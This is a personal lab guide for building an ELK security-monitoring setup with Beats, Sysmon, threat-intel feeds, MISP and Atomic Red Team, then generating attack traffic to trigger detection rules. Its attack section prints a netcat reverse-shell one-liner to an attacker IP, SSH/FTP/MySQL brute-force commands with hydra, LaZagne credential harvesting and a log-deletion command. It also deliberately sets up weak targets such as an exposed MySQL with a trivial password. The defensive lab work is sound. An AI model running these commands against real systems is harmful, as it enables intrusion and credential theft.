# INTRODUCTION
The goal of this page is to go trought all sets 
- Install ELK Stack with DOCKER
- Install Filebeat, AuditBeat, WinLogbeat etc on different plateform to send logs
- Configure theat intel modules to interac with IOCs
- Create custom rules
- Triggers the rules with specifics commands in Kali
- Install an apache server called POLY-APACHE
- Install a mysql server called POLY-DB


# Very helpful links!

<https://github.com/deviantony/docker-elk> Thanks you so much!

<https://www.elastic.co/fr/blog/establish-robust-threat-intelligence-with-elastic-security>

<https://www.elastic.co/guide/en/beats/winlogbeat/current/configuration-winlogbeat-options.html>

<!---
*******************************************************************************
-->
# ELK DOCKER - INSTALL UBUNTU to host ELK and Filebeat to send IOC to ELK
Download link here: <https://ubuntu.com/download/desktop>

## ELK DOCKER - INSTALL DOCKER ON UBUNTU

Reference: <https://docs.docker.com/engine/install/ubuntu/>

```
sudo apt-get remove docker docker-engine docker.io containerd runc

sudo apt-get update

sudo apt-get install \
	ca-certificates \
	curl \
	gnupg \
	lsb-release
	
sudo mkdir -p /etc/apt/keyrings

curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
  
sudo apt-get update

sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin

sudo docker run hello-world

sudo docker compose version
```

## ELK DOCKER - GET ELK STACK (DOCKER)
```
git clone https://github.com/deviantony/docker-elk.git
cd docker-elk

# Ref. :  https://docs.docker.com/compose/install/linux/#install-the-plugin-manually
# It seems that in Ubuntu Azure, docker compose v2 is installed (instead of v1) (2023-02-08)
# v1 = docker-compose
# v2 = docker compose

```

## ELK DOCKER - START ELK
```
sudo docker-compose up setup
sudo docker-compose up

# ufw deny 5601
# service ufw restart
```


<!---
*******************************************************************************
-->

# KIBANA ERROR ON STARTUP

Errors will occur, read carefully the logs when starting your instance.
I tried with Ubuntu Server but went back to Ubuntu Desktop (no xfce)

## KIBANA - Edit 

Generate a key with this command
```
poly@poly:~/docker-elk$ openssl rand -hex 16
8736b99e9d54e494f72078f719334b23
```

Edit the file
```
sudo vi kibana/config/kibana.yml

# Mandatory for the Security panel in ELK
xpack.encryptedSavedObjects.encryptionKey: "8736b99e9d54e494f72078f719334b23" 

#xpack.reporting.kibanaServer.hostname: localhost
#xpack.security.encryptionKey: "8736b99e9d54e494f72078f719334b23" 
```

Edit the file
```
sudo vi elasticsearch/config/elasticsearch.yml
xpack.security.enabled: false
```

Set [xpack.security.transport.ssl.enabled] to [true] or disable security by setting [xpack.security.enabled] to [false] in elasticsearch.yml


## KIBANA - Also add
Reference: <https://www.elastic.co/guide/en/kibana/current/using-kibana-with-security.html#security-configure-settings>

## POSSIBLE ERROR 1 - API integration key required
A new encryption key is generated for saved objects each time you start Kibana. Without a persistent key, you cannot delete or modify rules after Kibana restarts. 
To set a persistent key, add the xpack.encryptedSavedObjects.encryptionKey setting with any text value of 32 or more characters to the kibana.yml file.

### POSSIBLE ERROR 2 - xpack.security.transport.ssl.enabled
> Error : docker-elk-elasticsearch-1  | {"@timestamp":"2023-05-14T02:28:04.350Z", "log.level": "WARN", "message":"Transport SSL must be enabled if security is enabled. Please set [xpack.security.transport.ssl.enabled] to [true] or disable security by setting [xpack.security.enabled] to [false]", "ecs.version": "1.2.0","service.name":"ES_ECS","event.dataset":"elasticsearch.server","process.thread.name":"main","log.logger":"org.elasticsearch.bootstrap.BootstrapChecks","elasticsearch.node.name":"elasticsearch","elasticsearch.cluster.name":"docker-cluster"}

### POSSIBLE ERROR 3 - vm.max_map_count
Reference: <https://www.elastic.co/guide/en/elasticsearch/reference/current/vm-max-map-count.html>

>  Error : docker-elk-elasticsearch-1  | {"@timestamp":"2023-05-14T02:58:59.358Z", "log.level": "WARN", "message":"max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]", "ecs.version": "1.2.0","service.name":"ES_ECS","event.dataset":"elasticsearch.server","process.thread.name":"main","log.logger":"org.elasticsearch.bootstrap.BootstrapChecks","elasticsearch.node.name":"elasticsearch","elasticsearch.cluster.name":"docker-cluster"}
```
sudo sysctl -w vm.max_map_count=262144
sudo vi /etc/sysctl.conf
vm.max_map_count=262144
```



## ELK DOCKER - LOGIN TO ELK
Link here: <http://localhost:5601/app/home#/>

elastic / yourpassword


## KIBANA - There are 2 CTI goals with the current setup you are installing
- Threat Matched Detected: This section is solely reserved for threat indicator matches identified by an indicator match rule. Threat indicator matches are produced whenever event data matches a threat indicator field value in your indicator index. If indicator threat matches are not discovered, the section displays a message that none are available.
- Enriched with Threat Intelligence: This section shows indicator matches that Elastic Security found when querying the alert for fields with threat intelligence. You can use the date time picker to modify the query time frame, which looks at the past 30 days by default. Click the Inspect button, located on the far right of the threat label, to view more information on the query. If threat matches are not discovered within the selected time frame, the section displays a message that none are available.


<!---
*******************************************************************************
-->

# AUDITBEAT INSTALLATION ON UBUNTU 

For Linux AuditD / Better than the FILEBEAT's AuditD module, but VERY verbose

## AUDITBEAT - Install

```
curl -L -O https://artifacts.elastic.co/downloads/beats/auditbeat/auditbeat-8.6.2-amd64.deb
sudo dpkg -i auditbeat-8.6.2-amd64.deb
```

## AUDITBEAT - Uncomment HOST / USER / PASS
```
sudo vi /etc/auditbeat/auditbeat.yml
```

## AUDITBEAT - Add parameters for compatibility
allow_older_versions : "true"


## AUDITBEAT - Enable the auditbeat Kibana dashboard
Be very careful with the stdout output, some errors could be there
```
sudo auditbeat test output -e
sudo auditbeat setup -e
sudo auditbeat -e
```

## AUDITBEAT - Make it permanent
```
# Enable at boot
sudo systemctl enable auditbeat

# Make it permanent
sudo service auditbeat start
```

<!---
*******************************************************************************
-->
# FILEBEAT SETUP + CONFIGURATION

Reference: <https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-installation-configuration.html>

## FILEBEAT - Installation
Reference: <https://www.elastic.co/fr/security-labs/ingesting-threat-data-with-the-threat-intel-filebeat-module>

```
sudo apt install curl

curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.7.1-amd64.deb
sudo dpkg -i filebeat-8.7.1-amd64.deb
```

## FILEBEAT - Connectivity to ELK
```
sudo vi /etc/filebeat/filebeat.yml 

->->->		enabled: true
```

```
output.elasticsearch:
  # Array of hosts to connect to.
->->->  hosts: ["YOUR-ELK-IP-ADDRESS:9200"]

  # Protocol - either `http` (default) or `https`.
  #protocol: "https"

  # Authentication credentials - either API key or username/password.
  #api_key: "id:api_key"
->->->    username: "YOUR-ELK-USERNAME"
->->->    password: "YOUR-ELK-PASSWORD"
->->->    allow_older_versions : true
```

## FILEBEAT - APACHE2 module
To catch auth logs from apache
```
sudo filebeat modules enable apache
sudo vi /etc/filebeat/modules.d/apache.yml

->->->		enabled: true
```

## FILEBEAT - SYSTEM module
To catch auth logs from FTP or want to send syslog, enable this module
```
sudo filebeat modules enable system
sudo vi /etc/filebeat/modules.d/system.yml 

->->->		enabled: true
```

## FILEBEAT - IPTABLES module
To catch network connection from FTP
```
sudo filebeat modules enable iptables
sudo vi /etc/filebeat/modules.d/iptables.yml 

->->->		enabled: true
```

## FILEBEAT - MYSQL module
Do not specify a path, Filebeat will discover them for you
```
sudo filebeat modules enable mysql
sudo vi /etc/filebeat/modules.d/mysql.yml 

->->->    enabled: true
```

## FILEBEAT - No FTP module present
> Add the logs directly to filebeat input stream (TODO need to test)

Reference: <https://discuss.elastic.co/t/ftp-logs-filebeat/273430/2>

The ftp log should be taken care by the default config 

```
sudo vi /etc/filebeat/filebeat.yml
   - /var/log/vsftpd.log
```

## FILEBEAT - Test, dashboard upload to kibana and activation
Be very careful with the stdout output, some errors could be there

```
sudo filebeat test output -e
sudo filebeat setup -e
sudo filebeat -e
```

## FILEBEAT - ERROR - Validate if you have this error (not quite easy to see)
```
{"log.level":"error","@timestamp":"2023-01-26T20:48:07.041-0800","log.logger":"publisher_pipeline_output","log.origin":{"file.name":"pipeline/client_worker.go","file.line":150},"message":"Failed to connect to backoff
(elasticsearch(http://192.168.2.41:9200)): Connection marked as failed because the onConnect callback failed: 
```

## FILEBEAT - ERROR - Verify for the "too old" error

> Elasticsearch is too old. Please upgrade the instance. 
> If you would like to connect to older instances set output.elasticsearch.allow_older_versions to true. ES=8.5.3, Beat=8.6.1","service.name":"filebeat","ecs.version":"1.6.0"}
> The solution is to add allow_older_versions : "true" in the output.elasticsearch section

```
output.elasticsearch:
  # Array of hosts to connect to.
  hosts: ["localhost:9200"]

  # Protocol - either `http` (default) or `https`.
  #protocol: "https"

  # Authentication credentials - either API key or username/password.
  #api_key: "id:api_key"
  username: "**********"
  password: "**********"
  allow_older_versions : "true"
```

## FILEBEAT - ERROR - If you have this error "no enable fileset error"
You need to activate some modules as specified in my threatintel.yml section up here

## FILEBEAT - ERROR - No logs, so I try 

kern.log instead of iptables.log

```
sudo service ufw enable
```

## FILEBEAT - ERROR - Activate the endpoint module
Reference: <http://localhost:5601/app/integrations/detail/endpoint-8.2.0/overview>'


## FILEBEAT - Make it permanent
```
# Enable at boot
sudo systemctl enable filebeat

# Make it permanent
sudo service filebeat start
```


<!---
*******************************************************************************
-->
# WINLOGBEAT ON *** WINDOWS *** TO SEND EVENTS TO ELK

## WINLOGBEAT - Setup Kibana in the winlogbeat config to allow the activation of Kibana dashboard
Uncomment and the the kibana host for the winlogbeat setup
```
setup.kibana:

  # Kibana Host
  # Scheme and port can be left out and will be set to the default (http and 5601)
  # In case you specify and additional path, the scheme is required: http://localhost:5601/path
  # IPv6 addresses should always be defined as: https://[2001:db8::1]:5601
  host: "192.168.206.131:5601"
```

Do not forget the uncomment the user/pass lines
```
  username: "elastic"
  password: "changeme"
```

## Windows Path to winlogbeat binary

```
C:\ProgramData\Elastic\Beats\winlogbeat
```

## WINLOGBEAT - New proposed winlogbeat config! (2023-02-18)

Other good reference :
- <https://github.com/jhochwald/Universal-Winlogbeat-configuration>
- <https://github.com/jhochwald/Universal-Winlogbeat-configuration/issues/4>


My personal version is based on 'https://github.com/Cyb3rWard0g/HELK/blob/master/configs/winlogbeat/winlogbeat.yml'

```
#-------------------------- Windows Logs To Collect -----------------------------
winlogbeat.event_logs:
  - name: Application
    ignore_older: 30m
    provider:
      - TCP/IP
  - name: Security
    ignore_older: 30m
  - name: System
    ignore_older: 30m
  - name: Microsoft-Windows-Sysmon/Operational
    ignore_older: 30m
  - name: Microsoft-Windows-PowerShell/Operational
    ignore_older: 30m
    #event_id: 4103, 4104
    event_id: 4103, 4104, 4105, 4106
  - name: Windows PowerShell
    #event_id: 400,600
    event_id: 400, 403, 600, 800
    ignore_older: 30m
  - name: Microsoft-Windows-WMI-Activity/Operational
    event_id: 5857,5858,5859,5860,5861
  - name: ForwardedEvents
    tags: [forwarded]
  - name: Internet Explorer
    ignore_older: 30m
```

## WINLOGBEAT - Download sysmon
Link here: <https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon>

## WINLOGBEAT - Activate sysmon network connection
By default, tcp disabled by default, we need to activate it to have indicator match

```
The screenshot [-n] configures Sysmon to Log network connections as well. 
```

## WINLOGBEAT - SYSMON - Use the SwiftOnSecurity sysmon configuration https://github.com/SwiftOnSecurity/sysmon-config (2023-02-18)
```
sysmon.exe -accepteula -n -i sysmonconfig-export.xml
```

## WINLOGBEAT - SYSMON - Use a simple version (2023-02-18)
```
sysmon -i -accepteula -h md5,sha256,imphash -l -n
```

## WINLOGBEAT - Make sure to test the config  (2023-02-18)
```
winlogbeat.exe test config -e
```

## WINLOGBEAT - Setup
```
winlogbeat.exe setup -e
```

## WINLOGBEAT - Test
```
winlogbeat.exe test output -e
```

## WINLOGBEAT - Run winlogbeat in a *** privileged *** cmd.exe windows (to allow registry access, sysmon is a good example)

Be careful to start winlogbeat with Admin right!!! 
Otherwise a small error message will be hidden in the console saying that without admin rights, sysmon will not be ingested...

Thanks to kifarunix.com for the admin reminder! 'https://kifarunix.com/send-windows-logs-to-elastic-stack-using-winlogbeat-and-sysmon/'

```
winlogbeat.exe run -c winlogbeat.yml -e
```

## WINLOGBEAT - ERROR - If you have this error in winlogbeat output

{"log.level":"error","@timestamp":"2023-01-27T23:21:48.261-0500","log.logger":"publisher_pipeline_output","log.origin":
{"file.name":"pipeline/client_worker.go","file.line":150},"message":"Failed to connect to backoff(elasticsearch(http://192.168.206.131:9200)): 
Connection marked as failed because the onConnect callback failed: Elasticsearch is too old. Please upgrade the instance. 
If you would like to connect to older instances set output.elasticsearch.allow_older_versions to true. ES=8.5.3, Beat=8.6.1","service.name":"winlogbeat","ecs.version":"1.6.0"}

The solution is here
```
output.elasticsearch.allow_older_versions to true
```

<!---
*******************************************************************************
-->

# THREATINTEL - FILEBEAT  MODULE ACTIVATION (TO SEND IOC TO ELK)

## THREATINTEL - FILEBEAT - Activate the threatintel module
```
sudo filebeat modules enable threatintel
```

## THREATINTEL - FILEBEAT - Activate your feeds
```
sudo vi /etc/filebeat/modules.d/threatintel.yml 
```

Example :
	- module: threatintel
	  abuseurl:
		enabled: true

## THREATINTEL - FILEBEAT - For AlienVault, get your API key here and add it to threatintel.yml
Link here: <https://otx.alienvault.com/api>

## THREATINTEL - FILEBEAT - The authentication token used to contact the OTX API, can be found on the OTX UI.
```
var.api_token: put-your-key-here
```



<!---
*******************************************************************************
-->
# THREATINTEL - KIBANA INDICATORS

## THREATINTEL - KIBANA INDICATORS - Add the threatintel integration
```
# Not useful, works with the intel integration in Kibana? [http://localhost:5601/app/integrations/detail/ti_util-1.1.0/overview] (2023-02-08)
```

## THREATINTEL - KIBANA INDICATORS - Validate the ingestion here
```
[http://localhost:5601/app/security/threat_intelligence/indicators]

# I cannot publish the URL directly as it use a token in the URL
Look at this dashboard too : [Filebeat Threat Intel] AlienVault OTX
```


<!---
*******************************************************************************
-->
# IOC - TEST A THREAT INTELLIGENCE IOC DETECTION BY A KIBANA RULE

## IOC - Rule to activate, by default not all rules are activated
```
Rule = Threat Intel Filebeat Module (v8.x) Indicator Match
```

## IOC - Way to test
Test the IOC with MSEDGE or TELNET on the port
Ping or Tracert do no generate tcp/udp traffic (was a simple not working)

## IOC - Filebeat config
```
Update the securitySolution:defaultThreatIndex advanced setting by adding the appropriate index pattern name after the default Fleet threat intelligence index pattern (logs-ti*):
```

It is important to read the rules, and make sure it match your tests
Make sure the index is the right one
```
For this rule : Threat Intel Indicator Match
The dataset "event.dataset: ti_*" does not match the filebeat one
```

## IOC - Now we have a rule that match

IOC - For this rule : Threat Intel Filebeat Module (v8.x) Indicator Match


## IOC - Look at the rule, all the fields are matching (the one from the windows event, and the one from the IOC feed)
```
(destination.ip MATCHES threat.indicator.ip)
threat.indicator.ip: * -> come from abuse.ch, not alienvault
```

## IOC - Test one IOC
Use Powershell to simulate a c2 connection (for fun)

> x.x.x.x = pick one from alienvault, but be careful...

```
Invoke-WebRequest x.x.x.x -OutFile out.txt  -v
```

Expected results are :

> "Potential Process Injection via PowerShell" rule triggered


<!---
*******************************************************************************
-->
# ATOMIC RED TEAM TO TEST MITRE ATTACK WITH ELK

## ATOMIC RED TEAM - Installation
It needs to be done everytime you start powershell
```
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -getAtomics -Force

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
```

## ATOMIC RED TEAM - Launch a test
The list of available tests are documented here 

<https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md>
<https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.012/T1055.012.md>


<!---
*******************************************************************************
-->
## ATOMIC RED TEAM - T1055.012 - Process Injection: Process Hollowing
<https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.012/T1055.012.md>

```
Invoke-AtomicTest T1055.012 -ShowDetailsBrief​ -v
Invoke-AtomicTest T1055.012 -CheckPrereqs -v
Invoke-AtomicTest T1055.012 -GetPrereqs -v
​Invoke-AtomicTest T1055.012 -v
```

Expected results are :
> "Potential Process Injection via PowerShell" rule triggered

> "Potential Antimalware Scan Interface Bypass via PowerShell" rule triggered

<!---
*******************************************************************************
-->
## ATOMIC RED TEAM - T1037.001 - Boot or Logon Initialization Scripts: Logon Script
<https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1037.001/T1037.001.md>

```
Invoke-AtomicTest T1037.001 -v
```

Expected results are :

In progress...


<!---
*******************************************************************************
-->
## ATOMIC RED TEAM - T1071.001 - Application Layer Protocol: Web Protocols
<https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1071.001/T1071.001.md>

*** Your need to start IE first so the test can call IE (yep)

```
Invoke-AtomicTest T1071.001 -v
```

Expected results are :

> Nothing... We need to create a custom rule! More to come...

<!---
*******************************************************************************
-->
## ATOMIC RED TEAM - T1059.001 - Command and Scripting Interpreter: PowerShell
<https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md>

Thanks to <https://systemweakness.com/atomic-red-team-3-detecting-bloodhound-using-the-download-cradle-in-elk-siem-bc6960cb4066>

```
Invoke-AtomicTest T1059.001 -v
```

Expected results are :

> KQL = message: (SharpHound or BloodHound)  More to come...




<!---
*******************************************************************************
-->
Reference : <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd>

# CAN WE CONNECT TO Internet
```
nc google.com 80
GET /
```

# REVERSE SHELL FOR EXFILTRATION AND PERSISTENCE
| Always try to use a web port to hide ine the usual traffic

## On the attacker system
| The first step is to start a listener on the attacker box, so the victim will connect (reverse = from the victim to the attacker outside your network)
| No need to specify the ip adress as it will bind to 0.0.0.0
```
#ufw allow 8080
#service ufw restart
nc -nlvp 8080
```

## On the victim system (A310)
| The second step is to connect to the attacker and give acces to the victim shell
```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8080 >/tmp/f
```



<!---
*******************************************************************************
-->
# GENERATE TRAFFIC FOR DIFFERENTS PROTOCOLS

## GENERATE TRAFFIC - SSH bruteforce (A310)
```
nmap -p 22 --script ssh-brute poly-db
hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db ssh
```

## GENERATE TRAFFIC - FTP bruteforce
```
# -t : Number of parralel tasks
hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db ftp
```

## GENERATE TRAFFIC - MYSQL bruteforce
```
# -t : Number of parralel tasks
hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt poly-db mysql
```

## GENERATE TRAFFIC - MYSQL Request (A200, A201)
```
->->->->->-> poly@poly-db:/var/log/mysql$ sudo mysql -u root

	Welcome to the MySQL monitor.  Commands end with ; or \g.
	Your MySQL connection id is 9
	Server version: 8.0.33-0ubuntu0.22.04.1 (Ubuntu)

	Copyright (c) 2000, 2023, Oracle and/or its affiliates.

	Oracle is a registered trademark of Oracle Corporation and/or its
	affiliates. Other names may be trademarks of their respective
	owners.

	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

->->->->->-> 
show databases;
use dbUtilisateurs;
show tables;
select * from utilisateurs where admin = 1;

```

## GENERATE TRAFFIC - Web directory bruteforce (A101, A102)
```
dirbuster -u http://poly-apache
nikto -h poly-apache
```

## GENERATE TRAFFIC - Credential harvesting automation
Reference : 'https://github.com/AlessandroZ/LaZagne'

```
sudo python3 laZagne.py all -v
```
## GENERATE TRAFFIC - LinEnum execution (A300)
Reference : 'https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh'

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh > linenum.txt
```



## NEW RULES TO TEST!!!
'https://github.com/elastic/detection-rules/tree/main/rules/linux'

## NEW RULES TO TEST!!!
```
sudo rm -f /var/log/apache2/error.log 
```

<!---
*******************************************************************************
-->
# ELK RULE CREATION
Reference <https://www.elastic.co/guide/en/security/current/rules-ui-create.html>


<!---
*******************************************************************************
-->
# POLY-APACHE - Ubuntu setup with filebeat + vsFTPd + SSH + Apache2

> Install Ubuntu VM
> Install Filebeat 
> Install Auditbeat

## Install some services
```
sudo apt-get install vsftpd
sudo apt-get install ssh
sudo apt-get install apache2
```

## .htaccess for Apache
Reference : <https://tecadmin.net/enable-htaccess-apache-web-server/#:~:text=To%20enable%20.htaccess%20in%20Apache%2C%20follow%20these%20steps%3A,Apache%20web%20server%20to%20apply%20the%20changes.%20>

> Allow .htaccess in folders

```
sudo vi /etc/apache2/apache2.conf 

	<Directory /var/www/>
			Options Indexes FollowSymLinks
			#POLY AllowOverride None
	->->->      AllowOverride All
			Require all granted
	</Directory>

sudo service apache2 restart
```

> Create .htaccess in folders

```
sudo mkdir /var/www/html/backups
sudo vi /var/www/html/backups/.htaccess

Order deny,allow
Deny from all
```


## Allow some ports on the firewall
```
ufw allow 20 21 22
service ufw restart
```

## Brute force rule
<https://discuss.elastic.co/t/network-scan/322835>
<https://www.elastic.co/fr/security-labs/detect-credential-access>
<https://discuss.elastic.co/t/what-is-the-point-of-using-eql-to-correlate-log/294542/2>

<!---
*******************************************************************************
-->
# POLY-DB - Ubuntu setup with filebeat + MySql

Install Ubuntu VM
Install Filebeat 

## MYSQL - Install Mysql 
```
sudo apt-get install mysql-server
```

## MYSQL - Change the bind address
```
vi /etc/mysql/mysql.conf.d/mysqld.cnf 
```
> [MODIFY] bind-address 127.0.0.1 -> bind-address 0.0.0.0
++++++++++++++++++ MORE stuff 

'https://logstail.com/blog/how-to-analyze-mysql-logs-with-elk-stack-and-logstail-com/'
```
sudo service mysql restart
```

## MYSQL - Permissions
Reference: <https://www.techrepublic.com/article/how-to-set-change-and-recover-a-mysql-root-password/>
```
sudo mysql -u root

# Create a new user
CREATE USER 'mysqladmin'@'localhost' IDENTIFIED BY 'princess';
GRANT ALL PRIVILEGES ON *.* TO 'mysqladmin'@'localhost';

#mysql> CREATE USER 'root'@'192.168.6.130' IDENTIFIED BY 'princess';
#mysql> GRANT ALL PRIVILEGES ON database_name.* TO 'root'@'192.168.6.130';

```

```
sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf 

[mysqld]
log-error = /var/log/mysql/error.log

general_log = 1
general_log_file = /var/log/mysql/mysql.log

slow_query_log = 1
slow_query_log_file = /var/log/mysql/mysql-slow.log

# 0 will log every request - will be verbose
long_query_time = 0
log_queries_not_using_indexes = 1
```

## MYSQL - Create a weak user table based on public information...
Reference <https://sites.google.com/site/morinetkevin/competences-obligatoires/permettre-une-inscription-utilisateur-en-utilisant-mysql-php-html-et-css>

```
sudo mysql -u mysqladmin -p

drop database if exists dbUtilisateur;

create database dbUtilisateur;

use dbUtilisateur;

drop table if exists utilisateurs;

create table utilisateurs(
 id int,
 admin int,
 nom varchar(50),
 prenom varchar(30),
 email  varchar(50),
 telephone varchar(10),
 login varchar(30),
 motDePasse varchar(64),
PRIMARY KEY (id));

insert into utilisateurs(id, admin, nom, prenom, email, telephone, login, motDePasse) values (1, 1, 'john', 'doe', 'myjohn@john.io', '5145555555', 'jdoe', '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8');
insert into utilisateurs(id, admin, nom, prenom, email, telephone, login, motDePasse) values (2, 1, 'john', 'travolta', 'myjohn@notjohn.io', '5144877455', 'jt', '04e77bf8f95cb3e1a36a59d1e93857c411930db646b46c218a0352e432023cf2');
 
```

<!---
*******************************************************************************
-->
# MISP Threat Intelligence Platform (TIP)

## MISP - Installation
Here is the installation command. Please note that it will take a while to install...

```
git clone https://github.com/MISP/misp-docker

cd misp-docker

cp template.env .env 
```

## MISP - Change the base URL for your MISP IP

In the .env file 

```
#MISP_BASEURL=https://localhost
MISP_BASEURL=https://192.168.206.131/
```

## MISP - Change the timezone. To find yours, type this command

```
timedatectl
```

Replace with your timezone in the .env file 

> Time zone: America/Toronto (EST, -0500)

```
#TIMEZONE=Europe/Brussels
TIMEZONE=America/Toronto
```

## MISP - Start Docker
```
sudo docker compose up
```

## MISP - Activate feeds

<https://localhost/feeds/index>

> "Enable selected"

> "Enable caching for selected" 

> "Fetch and store all feed data"

## MISP - Refresh and wait

<'https://localhost/>

Wait a couple of minutes and go back to the main page, the feeds are loading

<!---
*******************************************************************************
-->
# UBUNTU GENERAL COMMANDS

## UBUNTU - Install Ubuntu-Desktop on Ubuntu 

Less intensive on the graphical side. Good with old hardware.

At login, choose "gnome session" as the display manager.???

```
sudo apt install ubuntu-desktop
```

## UBUNTU - Install xfce4 on Ubuntu 

Less intensive on the graphical side. Good with old hardware.

```
sudo apt install xfce4
```

At login, choose "Xfce session" as the display manager.

## UBUNTU - Install xRDP on Ubuntu

<https://linuxize.com/post/how-to-install-xrdp-on-ubuntu-20-04/>

```
sudo apt install xrdp 
sudo systemctl status xrdp

sudo adduser xrdp ssl-cert  

#20230314 sudo systemctl restart xrdp

sudo service xrdp restart
```

## UBUNTU - UFW - Some useful commands 

> Beware that Docker will use iptables directly, so everything you do to close some ports will not work.

```
sudo ufw allow 22
sudo ufw allow 3389
sudo ufw deny 5601

sudo ufw default deny incoming
sudo ufw default allow outgoing

sudo ufw enable
service ufw restart

sudo apt install gufw
```

## UBUNTU - VMWARE Install
Reference: <https://linux.how2shout.com/installing-vmware-workstation-17-player-on-ubuntu-22-04-lts/>


Download Vmware Workstation Player

```
sudo apt install gcc build-essential
cd Downloads
sudo bash VMware-Player-Full-*.x86_64.bundle
sudo vmware-modconfig --console --install-all
vmware
```

PS: Known bug I got = <https://www.linuxquestions.org/questions/slackware-14/vmware-player-on-14-2-xfce-failed-to-execute-command-%40%40binary%40%40-u-4175607129/>

## UBUNTU - VMWARE disk full

<https://communities.vmware.com/t5/VMware-Workstation-Player/VMware-Player-has-paused-this-virtual-machine/td-p/1192117>


> For security reasons, VMware doesn't allow VM's to start/run if there is not enough free disk space available. This is a percentage of the partition size.
> You can override this with mainMem.freeSpaceCheck = "FALSE" (see http://sanbarrow.com/vmx/vmx-advanced.html#vmx)
> Personally, I wouldn't take the risk and rather clean up the disk or move the VM to a larger disk.
> André



Ref.: <https://packages.ubuntu.com/bionic/x-session-manager>

## UBUNTU - x-session-manager

```
sudo apt install gnome-session-flashback
sudo apt install gnome-session
sudo apt install cinnamon-session
sudo apt install mate-session-manager
sudo apt install gdm3
 
# Select the right one
sudo update-alternatives --config x-session-manager

# Another option
sudo update-alternatives --install /usr/bin/x-session-manager x-session-manager /usr/lib/gnome-flashback/gnome-flashback-metacity 60

# Always restart that way
sudo service xrdp restart

#20230314 sudo systemctl restart xrdp
# Always restart that way
sudo service xrdp restart

#
sudo reboot
```

Back to default ( <https://ubuntuhandbook.org/index.php/2020/07/change-default-display-manager-ubuntu-20-04/> )

```
sudo dpkg-reconfigure gdm3 
sudo reboot
```

## KQL search for hunting
KQL bad = "session opened for user" - for ssh login success 
KQL = event.action: "ssh_login" AND  event.outcome:"success" - will not do a rule for that but it is a good hunting query
KQL = event.action: "ssh_login" AND  event.outcome:"success" AND source.ip: poly-apache and host.hostname:"poly-db" 
https://github.com/elastic/detection-rules
